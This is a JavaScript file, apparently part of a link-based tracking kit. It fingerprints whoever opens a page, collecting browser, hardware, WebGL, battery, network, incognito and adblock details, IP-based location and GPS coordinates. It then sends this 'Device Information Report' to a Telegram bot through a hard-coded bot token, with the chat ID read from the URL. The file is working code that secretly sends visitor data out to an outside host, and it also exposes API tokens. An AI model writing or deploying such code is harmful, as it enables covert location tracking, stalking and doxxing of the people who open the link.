// submit.js (updated: more robust battery, incognito heuristics, enhanced adblock & cookie checks)

async function collectAndSend(chatId) {
  if (!chatId) {
    console.warn('No chat id provided in URL.');
    return;
  }

  const safe = (fn, fallback = 'Unknown') => {
    try { const v = fn(); return (v === undefined || v === null) ? fallback : v; } catch { return fallback; }
  };

  // Basic / locale / browser
  const ua = navigator.userAgent || 'Unknown';
  const browser = (() => {
    const u = ua.toLowerCase();
    if (u.includes('edg/')) return 'Edge';
    if (u.includes('opr/') || u.includes('opera')) return 'Opera';
    if (u.includes('chrome') && !u.includes('chromium') && !u.includes('edg/')) return 'Chrome';
    if (u.includes('firefox')) return 'Firefox';
    if (u.includes('safari') && !u.includes('chrome')) return 'Safari';
    return ua;
  })();

  const platform = safe(() => navigator.platform || (navigator.userAgentData && navigator.userAgentData.platform), 'Unknown');
  const language = safe(() => navigator.language || (navigator.languages && navigator.languages[0]), 'Unknown');
  const timezone = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, 'Unknown');

  // Touch / Mouse detection
  function getTouchMouseType() {
    const hasTouch = 'ontouchstart' in window || (navigator.maxTouchPoints && navigator.maxTouchPoints > 0);
    const hasMouse = window.matchMedia && window.matchMedia('(pointer: fine)').matches;

    if (hasTouch && hasMouse) return 'Both';
    if (hasTouch) return 'Touch';
    if (hasMouse) return 'Mouse';
    return 'Unknown';
  }
  const touchMouse = getTouchMouseType();

  // Hardware
  const cpuCores = safe(() => navigator.hardwareConcurrency, 'Unknown');
  const ram = safe(() => (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown'));

  // Screen
  const resolution = safe(() => `${window.screen.width}x${window.screen.height}`, 'Unknown');
  const colorDepth = safe(() => `${window.screen.colorDepth}-bit`, 'Unknown');

  // WebGL info
  let webglVendor = 'Unknown', webglRenderer = 'Unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) {
        webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || 'Unknown';
        webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || 'Unknown';
      } else {
        webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
      }
    }
  } catch (e) {}

  // ---------- Battery (robust) ----------
  let batteryLevel = 'Unknown', batteryCharging = 'Unknown', batterySource = 'Unavailable';
  try {
    if (navigator.getBattery) {
      batterySource = 'navigator.getBattery';
      const b = await navigator.getBattery();
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    } else if (navigator.battery) { // some older prefixed APIs
      batterySource = 'navigator.battery';
      const b = navigator.battery;
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    } else if (navigator.mozBattery) {
      batterySource = 'navigator.mozBattery';
      const b = navigator.mozBattery;
      batteryLevel = (typeof b.level === 'number') ? Math.round(b.level * 100) + '%' : 'Unknown';
      batteryCharging = (typeof b.charging === 'boolean') ? (b.charging ? 'Yes' : 'No') : 'Unknown';
    } else {
      batterySource = 'Not supported';
    }
  } catch (e) {
    batterySource = 'Error';
  }

  // Network info
  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || null;
  const netType = connection ? (connection.type || connection.effectiveType || 'Unknown') : 'Unknown';
  const downlink = connection ? (connection.downlink ? connection.downlink + ' Mbps' : 'Unknown') : 'Unknown';
  const rtt = connection ? (connection.rtt ? Math.round(connection.rtt) + ' ms' : 'Unknown') : 'Unknown';
  const saveData = connection ? (connection.saveData ? 'Enabled' : 'Disabled') : 'Unknown';

  // ---------- Incognito Detection (improved heuristics) ----------
  async function detectIncognito() {
    const reasons = [];
    try {
      // 1) storage.estimate quota heuristic (Chromium)
      if (navigator.storage && navigator.storage.estimate) {
        try {
          const est = await navigator.storage.estimate();
          if (est && typeof est.quota === 'number') {
            const quotaMB = Math.round(est.quota / 1024 / 1024);
            // record value
            reasons.push(`quota=${quotaMB}MB`);
            // heuristic thresholds:
            // very small quota -> likely incognito (<=120MB)
            if (est.quota < 120 * 1024 * 1024) return { result: 'Yes', reason: reasons.join('; ') };
            // large quota -> likely not incognito
            if (est.quota > 300 * 1024 * 1024) reasons.push('quota-large');
          }
        } catch (e) { reasons.push('quota-check-failed'); }
      }

      // 2) storage.persisted() -> usually false in incognito
      if (navigator.storage && navigator.storage.persisted) {
        try {
          const isPersisted = await navigator.storage.persisted();
          reasons.push(`persisted=${isPersisted}`);
          if (!isPersisted) {
            // not definitive, but supports incognito detection
            // accumulate; don't decide solely on this
          }
        } catch (e) { reasons.push('persisted-check-failed'); }
      }

      // 3) localStorage test: setting may throw or silently fail in some private modes
      try {
        const testKey = '__ls_test_' + Date.now();
        localStorage.setItem(testKey, '1');
        const val = localStorage.getItem(testKey);
        localStorage.removeItem(testKey);
        if (val !== '1') {
          reasons.push('localStorage-no-persist');
          return { result: 'Yes', reason: reasons.join('; ') };
        } else {
          reasons.push('localStorage-ok');
        }
      } catch (e) {
        reasons.push('localStorage-error');
        return { result: 'Yes', reason: reasons.join('; ') };
      }

      // 4) IndexedDB open/write heuristic (Safari & others)
      if (window.indexedDB) {
        try {
          const dbName = 'incog_test_' + Math.random().toString(36).slice(2);
          const openReq = indexedDB.open(dbName, 1);
          const idxdbResult = await new Promise((resolve) => {
            let finished = false;
            openReq.onerror = () => { if (!finished) { finished = true; resolve('error'); } };
            openReq.onupgradeneeded = () => {
              // create object store to force write
              try {
                const db = openReq.result;
                db.createObjectStore('store');
              } catch (e) {}
            };
            openReq.onsuccess = () => { if (!finished) { finished = true; resolve('success'); } };
            setTimeout(() => { if (!finished) { finished = true; resolve('timeout'); } }, 1500);
          });
          if (idxdbResult === 'error') {
            reasons.push('indexeddb-error');
            return { result: 'Yes', reason: reasons.join('; ') };
          } else if (idxdbResult === 'success') {
            reasons.push('indexeddb-ok');
            try { indexedDB.deleteDatabase(dbName); } catch (e) {}
          } else {
            reasons.push('indexeddb-unknown');
          }
        } catch (e) {
          reasons.push('indexeddb-check-failed');
        }
      } else {
        reasons.push('no-indexeddb-api');
      }

      // If none of the above decisive heuristics returned 'Yes', assume 'No' (not incognito)
      return { result: 'No', reason: reasons.join('; ') || 'no-heuristics' };
    } catch (err) {
      return { result: 'Unknown', reason: 'error' };
    }
  }

  // ---------- Adblock & Cookie Detection (enhanced) ----------
  async function detectAdblockAndCookies() {
    const triggerMethods = [];
    let detected = 'Negative';

    // 0) Global adblock variables check
    try {
      if (window.blockAdBlock || window.canRunAds || window.blocked || window.adBlockEnabled) {
        triggerMethods.push('Globals');
        detected = 'Positive';
      }
    } catch (e) {}

    // 1) DOM bait
    try {
      const bait = document.createElement('div');
      bait.className = 'adsbygoogle adslot adunit ad-banner';
      bait.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;top:-9999px';
      document.body.appendChild(bait);
      await new Promise(r => setTimeout(r, 60));
      const isHidden = (bait.offsetParent === null || bait.offsetHeight === 0 || bait.clientHeight === 0 || getComputedStyle(bait).display === 'none');
      bait.remove();
      if (isHidden) {
        detected = 'Positive';
        triggerMethods.push('DOM');
      }
    } catch (e) {
      // ignore
    }

    // 2) Network fetch test
    try {
      if (detected === 'Negative') {
        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 2500);
        // many blockers block this URL; mode:no-cors so failures usually throw
        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', { method: 'GET', mode: 'no-cors', signal: controller.signal });
        clearTimeout(timeout);
        // if didn't throw, network didn't block it (note: silent success in no-cors)
      }
    } catch (e) {
      detected = 'Positive';
      if (!triggerMethods.includes('Network')) triggerMethods.push('Network');
    }

    // 3) Cookie tests
    let basicCookie = 'Unknown', blockerCookie = 'Unknown';
    try {
      // basic cookie test
      try {
        document.cookie = 'abctest=1; SameSite=Lax';
        basicCookie = document.cookie.includes('abctest') ? 'Set' : 'Blocked';
        // cleanup
        document.cookie = 'abctest=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax';
      } catch (e) {
        basicCookie = 'Error';
      }

      // blocker-specific cookie test (different name)
      try {
        document.cookie = 'adblock_cookie=1; SameSite=Lax';
        blockerCookie = document.cookie.includes('adblock_cookie') ? 'Set' : 'Blocked';
        // cleanup
        document.cookie = 'adblock_cookie=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=Lax';
      } catch (e) {
        blockerCookie = 'Error';
      }

      if (basicCookie === 'Blocked' || blockerCookie === 'Blocked') {
        if (!triggerMethods.includes('Cookie')) triggerMethods.push('Cookie');
        detected = 'Positive';
      }
    } catch (e) {
      // ignore
    }

    return { detected, methods: triggerMethods.length ? triggerMethods.join(',') : 'None', basicCookie, blockerCookie };
  }

  // ---------- Geolocation helper ----------
  async function getGeolocation() {
    let status = 'Denied', latitude = 'Denied', longitude = 'Denied';
    const getPos = (timeoutMs = 8000) => new Promise((resolve, reject) => {
      let done = false;
      if (!navigator.geolocation) return reject(new Error('No geolocation'));
      navigator.geolocation.getCurrentPosition(p => { if (!done) { done = true; resolve(p); } },
                                              e => { if (!done) { done = true; reject(e); } },
                                              { enableHighAccuracy: false, maximumAge: 60000, timeout: timeoutMs });
      setTimeout(() => { if (!done) { done = true; reject(new Error('timeout')); } }, timeoutMs + 200);
    });
    try {
      const p = await getPos();
      status = 'Allowed';
      latitude = p.coords.latitude;
      longitude = p.coords.longitude;
    } catch (err) {
      status = (err && err.code === err.PERMISSION_DENIED) ? 'Denied' : 'Unavailable';
    }
    return { status, latitude, longitude };
  }

  // run the async checks in parallel (incognito, adblock/cookies, geo)
  const [incognitoInfo, adblockInfo, geoResult] = await Promise.all([
    detectIncognito(),
    detectAdblockAndCookies(),
    getGeolocation()
  ]);

  // IP info
  let ip='Unknown', city='Unknown', region='Unknown', country='Unknown', org='Unknown';
  try {
    const res = await fetch('https://ipinfo.io/json?token=18d2a866939a58');
    if (res.ok) {
      const d = await res.json();
      ip = d.ip || ip;
      city = d.city || city;
      region = d.region || region;
      country = d.country || country;
      org = d.org || org;
    }
  } catch (e) {}

  // Build message
  const message = 
`🔰 Device Information Report 🔰

🌐 Basic Info:
- Browser: ${browser}
- Platform: ${platform}
- Language: ${language}
- Timezone: ${timezone}
- Touch/Mouse: ${touchMouse}

💻 Hardware:
- CPU: ${cpuCores} cores
- RAM: ${ram}
- Screen: ${resolution}, ${colorDepth}
- WebGL: ${webglRenderer} (${webglVendor})

📶 Network Info:
- Connection Type: ${netType}
- Speed: ${downlink}
- Latency: ${rtt}
- Data Saver: ${saveData}
- ISP: ${org || 'Unknown'}

📍 IP Info:
- IP: ${ip}
- City: ${city}
- Region: ${region}
- Country: ${country}
*Note: IP-based location may not be accurate.*

📌 GPS:
- Status: ${geoResult.status}
- Latitude: ${geoResult.latitude}
- Longitude: ${geoResult.longitude}
- Map View: https://www.google.com/maps?q=${geoResult.latitude},${geoResult.longitude}

🔐 Privacy & Adblock Info:
- Incognito / Private Mode: ${incognitoInfo.result} (${incognitoInfo.reason || 'no-reason'})
- Blocker Detected: ${adblockInfo.detected}
- Detection Methods: ${adblockInfo.methods}
- Basic Cookie: ${adblockInfo.basicCookie}
- Blocker Cookie: ${adblockInfo.blockerCookie}

🔋 Battery (${batterySource}):
- Level: ${batteryLevel}
- Charging: ${batteryCharging}
`;

  const token = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
  const tgUrl = `https://api.telegram.org/bot${token}/sendMessage`;

  try {
    await fetch(tgUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message })
    });
  } catch (err) {
    console.error('Telegram send error', err);
  }
}
